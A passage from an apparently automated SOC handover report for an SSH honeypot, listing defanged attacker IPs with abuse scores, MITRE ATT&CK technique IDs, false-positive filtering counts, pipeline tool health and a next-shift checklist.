| `120.198.138[.]185` | CN | China Mobile Communications Corporation | **100** ⚠️ | 21 |
| `189.152.42[.]213` | MX | Gestión de direccionamiento UniNet | **100** ⚠️ | 1 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `170.64.139[.]60` | AU | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `120.48.80[.]70` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 25 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1083](https://attack.mitre.org/techniques/T1083) | — |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | — |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 25 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 176 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 50 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 37 filtered (21.0%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 3 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 26 priority case(s) shown individually · 36 recon entry/entries in table (13 group(s) consolidating 90 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.1 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-15T05:27:21Z_
